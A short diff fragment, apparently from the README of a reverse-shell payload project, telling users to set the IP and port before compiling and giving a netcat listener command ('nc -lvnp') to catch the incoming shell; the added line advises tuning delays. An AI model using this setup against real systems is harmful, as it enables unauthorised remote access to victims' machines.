@@ -7,3 +7,5 @@ Make sure you change the ip and port values before compiling using https://paylo
 
 Run the below command server side to catch shell
 stty raw -echo; (stty size; cat) | nc -lvnp <port>
+
+Delays should be tweaked and configured based on your own experience
